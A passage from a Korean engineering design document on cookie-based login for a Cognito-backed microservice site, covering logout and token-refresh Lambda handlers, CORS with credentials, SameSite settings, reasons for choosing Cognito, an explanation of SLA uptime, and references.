<span class="hljs-keyword">const</span> logoutUrl = <span class="hljs-string">`https://<span class="hljs-subst">${COGNITO_DOMAIN}</span>/logout?
  client_id=<span class="hljs-subst">${CLIENT_ID}</span>&amp;
  logout_uri=https://accounts.ddcn41.com/login`</span>;

<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = logoutUrl;

<span class="hljs-comment">// 문제:</span>
<span class="hljs-comment">// 1. Cognito에서 로그아웃 처리</span>
<span class="hljs-comment">// 2. 브라우저 쿠키는 그대로 남아있음</span>
<span class="hljs-comment">// 3. 사용자가 다시 로그인 시도</span>
<span class="hljs-comment">// 4. Hosted UI가 쿠키를 확인하고 "이미 로그인됨"으로 판단</span>
<span class="hljs-comment">// 5. 자동으로 로그인 처리 (재로그인 없이)</span>
<span class="hljs-comment">// 6. 하지만 토큰은 무효화됨 (Cognito에서 Revoke됨)</span>
<span class="hljs-comment">// 7. API 호출 시 401 Unauthorized 에러</span>
</code></pre>
<h4 id="올바른-로그아웃-처리">올바른 로그아웃 처리</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// Lambda Auth Gateway: /v2/auth/logout</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleLogout</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-keyword">const</span> cognitoDomain = process.<span class="hljs-property">env</span>.<span class="hljs-property">COGNITO_DOMAIN</span>;
  <span class="hljs-keyword">const</span> clientId = process.<span class="hljs-property">env</span>.<span class="hljs-property">COGNITO_CLIENT_ID</span>;
  <span class="hljs-keyword">const</span> logoutUri = <span class="hljs-string">'https://accounts.ddcn41.com/login'</span>;

  <span class="hljs-comment">// 1. Cognito Logout URL 생성</span>
  <span class="hljs-keyword">const</span> cognitoLogoutUrl = <span class="hljs-string">`https://<span class="hljs-subst">${cognitoDomain}</span>/logout?`</span> +
    <span class="hljs-string">`client_id=<span class="hljs-subst">${clientId}</span>&amp;`</span> +
    <span class="hljs-string">`logout_uri=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(logoutUri)}</span>`</span>;

  <span class="hljs-comment">// 2. 쿠키 제거 (MaxAge=0)</span>
  <span class="hljs-keyword">const</span> cookies = [
    <span class="hljs-string">'access_token=; Domain=.ddcn41.com; HttpOnly; Secure; Path=/; Max-Age=0'</span>,
    <span class="hljs-string">'id_token=; Domain=.ddcn41.com; HttpOnly; Secure; Path=/; Max-Age=0'</span>,
    <span class="hljs-string">'refresh_token=; Domain=.ddcn41.com; HttpOnly; Secure; Path=/; Max-Age=0'</span>
  ];

  <span class="hljs-comment">// 3. Cognito Logout URL로 리다이렉트</span>
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">statusCode</span>: <span class="hljs-number">302</span>,
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-string">'Location'</span>: cognitoLogoutUrl,
      <span class="hljs-string">'Access-Control-Allow-Origin'</span>: <span class="hljs-string">'https://accounts.ddcn41.com'</span>,
      <span class="hljs-string">'Access-Control-Allow-Credentials'</span>: <span class="hljs-string">'true'</span>,
    },
    cookies,
    <span class="hljs-attr">body</span>: <span class="hljs-string">''</span>
  };
}
</code></pre>
<h4 id="로그아웃-플로우">로그아웃 플로우</h4>
<pre><code>1. Frontend → Lambda Auth Gateway
   POST /v2/auth/logout

2. Lambda 응답
   302 Found
   Location: https://ap-northeast-2u5ovprfcs.auth.ap-northeast-2.amazoncognito.com/logout?...
   Set-Cookie: access_token=; Max-Age=0
   Set-Cookie: id_token=; Max-Age=0
   Set-Cookie: refresh_token=; Max-Age=0

3. Browser → Cognito Logout URL
   → Cognito에서 세션 무효화

4. Cognito → Redirect to logout_uri
   https://accounts.ddcn41.com/login

5. 사용자는 로그인 페이지로 이동
   → 쿠키가 제거되어 재인증 필요
</code></pre><h3 id="2-token-refresh-전략">2. Token Refresh 전략</h3>
<h4 id="access-token-만료-처리">Access Token 만료 처리</h4>
<pre><code class="lang-typescript"><span class="hljs-comment">// Frontend API Client</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">apiCall</span>(<span class="hljs-params"><span class="hljs-attr">path</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">options</span>?: <span class="hljs-title class_">RequestInit</span></span>) {
  <span class="hljs-keyword">let</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(path, {
    ...options,
    <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>  <span class="hljs-comment">// 쿠키 자동 전송</span>
  });

  <span class="hljs-comment">// 401 Unauthorized → Token 갱신 시도</span>
  <span class="hljs-keyword">if</span> (response.<span class="hljs-property">status</span> === <span class="hljs-number">401</span>) {
    <span class="hljs-keyword">const</span> refreshed = <span class="hljs-keyword">await</span> <span class="hljs-title function_">refreshAccessToken</span>();

    <span class="hljs-keyword">if</span> (refreshed) {
      <span class="hljs-comment">// 재시도</span>
      response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(path, {
        ...options,
        <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>
      });
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// Refresh Token도 만료 → 로그인 페이지</span>
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'/login'</span>;
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Session expired'</span>);
    }
  }

  <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();
}

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">refreshAccessToken</span>(<span class="hljs-params"></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">boolean</span>&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/v2/auth/refresh'</span>, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>  <span class="hljs-comment">// Refresh Token 쿠키 전송</span>
    });

    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) {
      <span class="hljs-comment">// Lambda가 새로운 Access Token 쿠키 설정</span>
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
}
</code></pre>
<h4 id="lambda-token-refresh-handler">Lambda Token Refresh Handler</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// /v2/auth/refresh</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleRefresh</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-comment">// 1. Refresh Token 쿠키 추출</span>
  <span class="hljs-keyword">const</span> cookies = <span class="hljs-title function_">parseCookies</span>(event.<span class="hljs-property">headers</span>.<span class="hljs-property">cookie</span>);
  <span class="hljs-keyword">const</span> refreshToken = cookies[<span class="hljs-string">'refresh_token'</span>];

  <span class="hljs-keyword">if</span> (!refreshToken) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">statusCode</span>: <span class="hljs-number">401</span>,
      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">message</span>: <span class="hljs-string">'No refresh token'</span> })
    };
  }

  <span class="hljs-comment">// 2. Cognito Token Refresh</span>
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> cognitoClient.<span class="hljs-title function_">send</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InitiateAuthCommand</span>({
    <span class="hljs-title class_">AuthFlow</span>: <span class="hljs-string">'REFRESH_TOKEN_AUTH'</span>,
    <span class="hljs-title class_">ClientId</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">COGNITO_CLIENT_ID</span>,
    <span class="hljs-title class_">AuthParameters</span>: {
      <span class="hljs-attr">REFRESH_TOKEN</span>: refreshToken
    }
  }));

  <span class="hljs-keyword">const</span> { <span class="hljs-title class_">AccessToken</span>, <span class="hljs-title class_">IdToken</span> } = response.<span class="hljs-property">AuthenticationResult</span>;

  <span class="hljs-comment">// 3. 새로운 Access Token 쿠키 설정</span>
  <span class="hljs-keyword">const</span> cookies = [
    <span class="hljs-string">`access_token=<span class="hljs-subst">${AccessToken}</span>; Domain=.ddcn41.com; HttpOnly; Secure; Path=/; Max-Age=3600`</span>,
    <span class="hljs-string">`id_token=<span class="hljs-subst">${IdToken}</span>; Domain=.ddcn41.com; HttpOnly; Secure; Path=/; Max-Age=3600`</span>
  ];

  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">statusCode</span>: <span class="hljs-number">200</span>,
    cookies,
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">message</span>: <span class="hljs-string">'Token refreshed'</span> })
  };
}
</code></pre>
<h3 id="3-cors-설정-주의사항">3. CORS 설정 주의사항</h3>
<h4 id="잘못된-설정-작동-안-함">잘못된 설정 (작동 안 함)</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// ❌ Wildcard with Credentials</span>
{
  <span class="hljs-string">'Access-Control-Allow-Origin'</span>: <span class="hljs-string">'*'</span>,
  <span class="hljs-string">'Access-Control-Allow-Credentials'</span>: <span class="hljs-string">'true'</span>
}
<span class="hljs-comment">// → 에러: Credential mode 'include' with wildcard origin not allowed</span>
</code></pre>
<h4 id="올바른-설정">올바른 설정</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// ✅ 특정 Origin 명시</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getCorsHeaders</span>(<span class="hljs-params">origin</span>) {
  <span class="hljs-keyword">const</span> allowedOrigins = [
    <span class="hljs-string">'https://ddcn41.com'</span>,
    <span class="hljs-string">'https://accounts.ddcn41.com'</span>,
    <span class="hljs-string">'https://admin.ddcn41.com'</span>,
    <span class="hljs-string">'http://app.local'</span>  <span class="hljs-comment">// 로컬 개발</span>
  ];

  <span class="hljs-keyword">return</span> {
    <span class="hljs-string">'Access-Control-Allow-Origin'</span>: allowedOrigins.<span class="hljs-title function_">includes</span>(origin)
      ? origin
      : <span class="hljs-string">'https://ddcn41.com'</span>,
    <span class="hljs-string">'Access-Control-Allow-Credentials'</span>: <span class="hljs-string">'true'</span>,
    <span class="hljs-string">'Access-Control-Allow-Methods'</span>: <span class="hljs-string">'GET, POST, PUT, DELETE, OPTIONS'</span>,
    <span class="hljs-string">'Access-Control-Allow-Headers'</span>: <span class="hljs-string">'Content-Type, Authorization'</span>,
  };
}
</code></pre>
<h3 id="4-samesite-정책">4. SameSite 정책</h3>
<h4 id="설정-비교">설정 비교</h4>
<pre><code class="lang-javascript"><span class="hljs-comment">// SameSite=Strict (가장 엄격)</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: token=abc; <span class="hljs-title class_">SameSite</span>=<span class="hljs-title class_">Strict</span>
<span class="hljs-comment">// → Cross-Site 요청에서 쿠키 전송 안 됨</span>
<span class="hljs-comment">// → 예: Google 검색 → ddcn41.com 클릭 시 쿠키 안 보냄 (로그인 풀림)</span>

<span class="hljs-comment">// SameSite=Lax (권장)</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: token=abc; <span class="hljs-title class_">SameSite</span>=<span class="hljs-title class_">Lax</span>
<span class="hljs-comment">// → GET 요청은 쿠키 전송 (탐색 가능)</span>
<span class="hljs-comment">// → POST, PUT, DELETE는 Same-Site만 (CSRF 방어)</span>
<span class="hljs-comment">// → 예: Google 검색 → ddcn41.com 클릭 시 쿠키 보냄 (로그인 유지)</span>

<span class="hljs-comment">// SameSite=None (제한 없음)</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: token=abc; <span class="hljs-title class_">SameSite</span>=<span class="hljs-title class_">None</span>; <span class="hljs-title class_">Secure</span>
<span class="hljs-comment">// → 모든 Cross-Site 요청에 쿠키 전송</span>
<span class="hljs-comment">// → Secure 플래그 필수 (HTTPS only)</span>
<span class="hljs-comment">// → iframe 내에서 인증 필요한 경우 사용</span>
</code></pre>
<hr></hr>
<h2 id="결론">결론</h2>
<h3 id="msa-환경에서-쿠키-선택의-핵심-이유">MSA 환경에서 쿠키 선택의 핵심 이유</h3>
<ol>
<li><p><strong>서브도메인 간 인증 공유</strong></p>
<ul>
<li><code>Domain=.ddcn41.com</code> 또는 <code>Domain=ddcn41.com</code> 설정으로 모든 <code>*.ddcn41.com</code>에서 쿠키 자동 전송</li>
<li>RFC 6265: leading dot은 무시되므로 두 방식 동일하게 동작</li>
<li>로컬스토리지는 Same-Origin만 가능 (공유 불가)</li>
</ul>
</li>
<li><p><strong>보안 강화</strong></p>
<ul>
<li><code>HttpOnly</code> 플래그로 XSS 공격 방어</li>
<li><code>Secure</code> 플래그로 HTTPS 전용</li>
<li><code>SameSite=Lax</code>로 CSRF 완화</li>
</ul>
</li>
<li><p><strong>브라우저 자동 전송</strong></p>
<ul>
<li>API 호출 시 쿠키 자동 포함</li>
<li>로컬스토리지는 수동으로 헤더에 추가 필요</li>
</ul>
</li>
<li><p><strong>단순한 구현</strong></p>
<ul>
<li>크로스 도메인 토큰 전달 로직 불필요</li>
<li>토큰 갱신 등 자동 처리</li>
</ul>
</li>
</ol>
<h3 id="cognito-선택의-핵심-이유">Cognito 선택의 핵심 이유</h3>
<ol>
<li><p><strong>AWS 생태계 통합</strong></p>
<ul>
<li>CloudWatch 자동 로깅</li>
<li>Lambda Triggers 커스터마이징</li>
<li>SNS 알림 간편</li>
</ul>
</li>
<li><p><strong>비용 효율성</strong></p>
<ul>
<li>월 10,000 MAU까지 무료</li>
<li>자체 구축 대비 1/10 비용</li>
</ul>
</li>
<li><p><strong>확장성</strong></p>
<ul>
<li>MFA, Social Login 간편 추가</li>
<li>사용자 그룹 및 권한 관리</li>
<li>AWS SLA 보장</li>
</ul>
</li>
</ol>
<p><strong>SLA (Service Level Agreement) 란?</strong> ⁴</p>
<p>서비스 제공자가 고객에게 약속하는 서비스 품질 수준 및 보상 조건을 명시한 계약입니다.</p>
<pre><code class="lang-yaml"><span class="hljs-attr">AWS Cognito SLA:</span>
  <span class="hljs-string">보장</span> <span class="hljs-string">가동</span> <span class="hljs-string">시간:</span> <span class="hljs-number">99.9</span><span class="hljs-string">%</span> <span class="hljs-string">(Three</span> <span class="hljs-string">Nines)</span>
  <span class="hljs-string">월간</span> <span class="hljs-string">허용</span> <span class="hljs-string">다운타임:</span> <span class="hljs-number">43.8</span><span class="hljs-string">분</span>

  <span class="hljs-string">계산:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">월</span> <span class="hljs-string">총</span> <span class="hljs-string">시간:</span> <span class="hljs-number">30</span><span class="hljs-string">일</span> <span class="hljs-string">×</span> <span class="hljs-number">24</span><span class="hljs-string">시간</span> <span class="hljs-string">×</span> <span class="hljs-number">60</span><span class="hljs-string">분</span> <span class="hljs-string">=</span> <span class="hljs-number">43</span><span class="hljs-string">,200분</span>
    <span class="hljs-bullet">-</span> <span class="hljs-number">99.9</span><span class="hljs-string">%</span> <span class="hljs-string">가동</span> <span class="hljs-string">=</span> <span class="hljs-number">43</span><span class="hljs-string">,200분</span> <span class="hljs-string">×</span> <span class="hljs-number">0.999</span> <span class="hljs-string">=</span> <span class="hljs-number">43</span><span class="hljs-string">,156.8분</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">허용</span> <span class="hljs-string">다운타임</span> <span class="hljs-string">=</span> <span class="hljs-number">43</span><span class="hljs-string">,200분</span> <span class="hljs-bullet">-</span> <span class="hljs-number">43</span><span class="hljs-string">,156.8분</span> <span class="hljs-string">=</span> <span class="hljs-number">43.2</span><span class="hljs-string">분</span>

  <span class="hljs-string">보상</span> <span class="hljs-string">정책:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-number">99.0</span><span class="hljs-string">%</span> <span class="hljs-string">~</span> <span class="hljs-number">99.9</span><span class="hljs-string">%:</span> <span class="hljs-string">서비스</span> <span class="hljs-string">크레딧</span> <span class="hljs-number">10</span><span class="hljs-string">%</span>
    <span class="hljs-bullet">-</span> <span class="hljs-number">95.0</span><span class="hljs-string">%</span> <span class="hljs-string">~</span> <span class="hljs-number">99.0</span><span class="hljs-string">%:</span> <span class="hljs-string">서비스</span> <span class="hljs-string">크레딧</span> <span class="hljs-number">25</span><span class="hljs-string">%</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">&lt;95.0%:</span> <span class="hljs-string">서비스</span> <span class="hljs-string">크레딧</span> <span class="hljs-number">100</span><span class="hljs-string">%</span>

<span class="hljs-string">AWS</span> <span class="hljs-string">다른</span> <span class="hljs-string">서비스</span> <span class="hljs-string">SLA</span> <span class="hljs-string">비교:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">S3:</span> <span class="hljs-number">99.9</span><span class="hljs-string">%</span> <span class="hljs-string">(Three</span> <span class="hljs-string">Nines)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">EC2:</span> <span class="hljs-number">99.99</span><span class="hljs-string">%</span> <span class="hljs-string">(Four</span> <span class="hljs-string">Nines)</span> <span class="hljs-bullet">-</span> <span class="hljs-string">월</span> <span class="hljs-number">4.3</span><span class="hljs-string">분</span> <span class="hljs-string">다운타임</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">DynamoDB:</span> <span class="hljs-number">99.99</span><span class="hljs-string">%</span> <span class="hljs-string">(Four</span> <span class="hljs-string">Nines)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">RDS Multi-AZ:</span> <span class="hljs-number">99.95</span><span class="hljs-string">%</span> <span class="hljs-string">(월</span> <span class="hljs-number">21.6</span><span class="hljs-string">분</span> <span class="hljs-string">다운타임)</span>

<span class="hljs-string">SLA</span> <span class="hljs-string">용어:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">가동</span> <span class="hljs-string">시간</span> <span class="hljs-string">(Uptime):</span> <span class="hljs-string">서비스가</span> <span class="hljs-string">정상</span> <span class="hljs-string">작동하는</span> <span class="hljs-string">시간</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">다운타임</span> <span class="hljs-string">(Downtime):</span> <span class="hljs-string">서비스가</span> <span class="hljs-string">중단된</span> <span class="hljs-string">시간</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">가용성</span> <span class="hljs-string">(Availability):</span> <span class="hljs-string">가동</span> <span class="hljs-string">시간</span> <span class="hljs-string">/</span> <span class="hljs-string">총</span> <span class="hljs-string">시간</span> <span class="hljs-string">×</span> <span class="hljs-number">100</span><span class="hljs-string">%</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">크레딧</span> <span class="hljs-string">(Service</span> <span class="hljs-attr">Credit):</span> <span class="hljs-string">SLA</span> <span class="hljs-string">미달</span> <span class="hljs-string">시</span> <span class="hljs-string">AWS가</span> <span class="hljs-string">제공하는</span> <span class="hljs-string">보상</span>

<span class="hljs-string">자체</span> <span class="hljs-string">구축</span> <span class="hljs-attr">vs Cognito:</span>
  <span class="hljs-string">자체</span> <span class="hljs-string">인증</span> <span class="hljs-string">서버</span> <span class="hljs-string">(EC2):</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">SLA:</span> <span class="hljs-string">보장</span> <span class="hljs-string">없음</span> <span class="hljs-string">(개발자</span> <span class="hljs-string">책임)</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">가용성:</span> <span class="hljs-string">수동</span> <span class="hljs-string">모니터링</span> <span class="hljs-string">및</span> <span class="hljs-string">복구</span> <span class="hljs-string">필요</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">다운타임:</span> <span class="hljs-string">배포,</span> <span class="hljs-string">패치,</span> <span class="hljs-string">장애</span> <span class="hljs-string">시</span> <span class="hljs-string">발생</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">이중화:</span> <span class="hljs-string">직접</span> <span class="hljs-string">구성</span> <span class="hljs-string">및</span> <span class="hljs-string">관리</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">비용:</span> <span class="hljs-string">서버</span> <span class="hljs-string">비용</span> <span class="hljs-string">+</span> <span class="hljs-string">인건비</span> <span class="hljs-string">+</span> <span class="hljs-string">모니터링</span> <span class="hljs-string">비용</span>

  <span class="hljs-attr">AWS Cognito:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">SLA:</span> <span class="hljs-number">99.9</span><span class="hljs-string">%</span> <span class="hljs-string">보장</span> <span class="hljs-string">(AWS</span> <span class="hljs-string">책임)</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">가용성:</span> <span class="hljs-string">AWS</span> <span class="hljs-string">Multi-AZ</span> <span class="hljs-string">자동</span> <span class="hljs-string">이중화</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">다운타임:</span> <span class="hljs-string">월</span> <span class="hljs-number">43.8</span><span class="hljs-string">분</span> <span class="hljs-string">이하</span> <span class="hljs-string">보장</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">이중화:</span> <span class="hljs-string">AWS</span> <span class="hljs-string">자동</span> <span class="hljs-string">관리</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">비용:</span> <span class="hljs-string">MAU</span> <span class="hljs-number">10</span><span class="hljs-string">,000명까지</span> <span class="hljs-string">무료</span>

<span class="hljs-string">실제</span> <span class="hljs-string">의미:</span>
  <span class="hljs-number">99.9</span><span class="hljs-string">%</span> <span class="hljs-string">SLA</span> <span class="hljs-string">보장:</span>
    <span class="hljs-string">→</span> <span class="hljs-string">연간</span> <span class="hljs-number">8.76</span><span class="hljs-string">시간</span> <span class="hljs-string">(525.6분)</span> <span class="hljs-string">이하</span> <span class="hljs-string">다운타임</span>
    <span class="hljs-string">→</span> <span class="hljs-string">월간</span> <span class="hljs-number">43.8</span><span class="hljs-string">분</span> <span class="hljs-string">이하</span> <span class="hljs-string">다운타임</span>
    <span class="hljs-string">→</span> <span class="hljs-string">주간</span> <span class="hljs-number">10.1</span><span class="hljs-string">분</span> <span class="hljs-string">이하</span> <span class="hljs-string">다운타임</span>
    <span class="hljs-string">→</span> <span class="hljs-string">일간</span> <span class="hljs-number">1.44</span><span class="hljs-string">분</span> <span class="hljs-string">이하</span> <span class="hljs-string">다운타임</span>

  <span class="hljs-number">99.99</span><span class="hljs-string">%</span> <span class="hljs-string">SLA</span> <span class="hljs-string">보장</span> <span class="hljs-string">(EC2):</span>
    <span class="hljs-string">→</span> <span class="hljs-string">연간</span> <span class="hljs-number">52.56</span><span class="hljs-string">분</span> <span class="hljs-string">이하</span> <span class="hljs-string">다운타임</span>
    <span class="hljs-string">→</span> <span class="hljs-string">월간</span> <span class="hljs-number">4.38</span><span class="hljs-string">분</span> <span class="hljs-string">이하</span> <span class="hljs-string">다운타임</span>
    <span class="hljs-string">→</span> <span class="hljs-string">주간</span> <span class="hljs-number">1.01</span><span class="hljs-string">분</span> <span class="hljs-string">이하</span> <span class="hljs-string">다운타임</span>
    <span class="hljs-string">→</span> <span class="hljs-string">일간</span> <span class="hljs-number">8.64</span><span class="hljs-string">초</span> <span class="hljs-string">이하</span> <span class="hljs-string">다운타임</span>

<span class="hljs-string">SLA</span> <span class="hljs-string">모니터링:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">CloudWatch로</span> <span class="hljs-string">Cognito</span> <span class="hljs-string">가용성</span> <span class="hljs-string">자동</span> <span class="hljs-string">모니터링</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">AWS</span> <span class="hljs-string">Personal</span> <span class="hljs-string">Health</span> <span class="hljs-string">Dashboard에서</span> <span class="hljs-string">SLA</span> <span class="hljs-string">위반</span> <span class="hljs-string">알림</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">AWS</span> <span class="hljs-string">Service</span> <span class="hljs-string">Health</span> <span class="hljs-string">Dashboard에서</span> <span class="hljs-string">실시간</span> <span class="hljs-string">상태</span> <span class="hljs-string">확인</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">SLA</span> <span class="hljs-string">위반</span> <span class="hljs-string">시</span> <span class="hljs-string">자동으로</span> <span class="hljs-string">크레딧</span> <span class="hljs-string">청구</span> <span class="hljs-string">가능</span>
</code></pre>
<blockquote>
<p>⁴ 참조: <a href="https://aws.amazon.com/cognito/sla/" target="_blank">AWS Cognito Service Level Agreement</a></p>
</blockquote>
<h3 id="로컬-개발-환경-권장-방법">로컬 개발 환경 권장 방법</h3>
<ol>
<li><strong>일상 개발</strong>: JWT Bearer Token (localhost 그대로)</li>
<li><strong>통합 테스트</strong>: Nginx Reverse Proxy + mkcert HTTPS</li>
<li><strong>CI/CD</strong>: Staging 환경 + 실제 Cognito</li>
</ol>
<hr></hr>
<h2 id="참고-자료-references">참고 자료 (References)</h2>
<h3 id="공식-문서-official-documentation">공식 문서 (Official Documentation)</h3>
<h4 id="aws-cloudfront">AWS CloudFront</h4>
<ul>
<li><a href="https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/DownloadDistValuesCacheBehavior" target="_blank">CloudFront Cache Behavior Configuration</a></li>
<li><a href="https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/distribution-web-values-specify.html#DownloadDistValuesPathPattern" target="_blank">CloudFront Path Pattern Wildcards</a></li>
<li><a href="https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Expiration.html" target="_blank">CloudFront TTL Settings</a></li>
</ul>
<h4 id="aws-cognito">AWS Cognito</h4>
<ul>
<li><a href="https://aws.amazon.com/cognito/sla/" target="_blank">Amazon Cognito Service Level Agreement (SLA)</a></li>
<li><a href="https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-identity-pools.html" target="_blank">Amazon Cognito User Pools</a></li>
<li><a href="https://docs.aws.amazon.com/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-verifying-a-jwt.html" target="_blank">AWS Cognito JWT Token Verification</a></li>
<li><a href="https://github.com/aws-samples/amazon-cognito-passwordless-auth" target="_blank">Amazon Cognito Passwordless Authentication</a></li>
</ul>
<h4 id="aws-application-load-balancer">AWS Application Load Balancer</h4>
<ul>
<li><a href="https://docs.aws.amazon.com/prescriptive-guidance/latest/load-balancer-stickiness/alb-cookies-stickiness.html" target="_blank">Sticky Sessions with ALB</a></li>
<li><a href="https://repost.aws/knowledge-center/elb-alb-stickiness" target="_blank">Troubleshoot ALB Session Stickiness</a></li>
</ul>
<h4 id="http-cookies--security">HTTP Cookies &amp; Security</h4>
<ul>
<li><a href="https://datatracker.ietf.org/doc/html/rfc6265" target="_blank">RFC 6265: HTTP State Management Mechanism (Cookies)</a></li>
<li><a href="https://httpwg.org/http-extensions/draft-ietf-httpbis-rfc6265bis.html" target="_blank">RFC 6265bis: Cookies: HTTP State Management Mechanism</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-cookie-same-site-00" target="_blank">draft-ietf-httpbis-cookie-same-site: SameSite Cookie Attribute</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie" target="_blank">MDN Web Docs: Set-Cookie Header</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies" target="_blank">MDN Web Docs: Using HTTP Cookies</a></li>
</ul>
<h4 id="security-standards">Security Standards</h4>
<ul>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">OWASP Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF" target="_blank">MDN Web Docs: Cross-Site Request Forgery (CSRF)</a></li>
<li><a href="https://web.dev/articles/samesite-cookies-explained" target="_blank">SameSite Cookies Explained (web.dev)</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">Content Security Policy (CSP) Reference</a></li>
</ul>
<h3 id="기술-아티클-technical-articles">기술 아티클 (Technical Articles)</h3>
<ul>
<li><a href="https://airman604.medium.com/do-samesite-cookies-solve-csrf-6dcd02dc9383" target="_blank">Do SameSite Cookies Solve CSRF?</a></li>
<li><a href="https://www.invicti.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/" target="_blank">Preventing CSRF Attacks with SameSite Cookie Attribute</a></li>
<li><a href="https://uptime.is/" target="_blank">SLA &amp; Uptime Calculator</a></li>
</ul>
<h3 id="관련-프로젝트-문서">관련 프로젝트 문서</h3>
<ul>
<li><a href="AUTH_COOKIE_SESSION_GUIDE.md">AUTH_COOKIE_SESSION_GUIDE.md</a> - 쿠키 기반 세션 구현 가이드</li>
<li><a href="COOKIE_SESSION_TROUBLESHOOTING.md">COOKIE_SESSION_TROUBLESHOOTING.md</a> - 쿠키 세션 트러블슈팅</li>
<li><a href="AUTH_FLOW_COMPLETE.md">AUTH_FLOW_COMPLETE.md</a> - 완전한 인증 플로우</li>
<li><a href="COGNITO_MIGRATION_GUIDE.md">COGNITO_MIGRATION_GUIDE.md</a> - Cognito 마이그레이션 가이드</li>
</ul>
<hr></hr>
<p><strong>작성일</strong>: 2025-10-13
<strong>최종 업데이트</strong>: 2025-10-13</p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
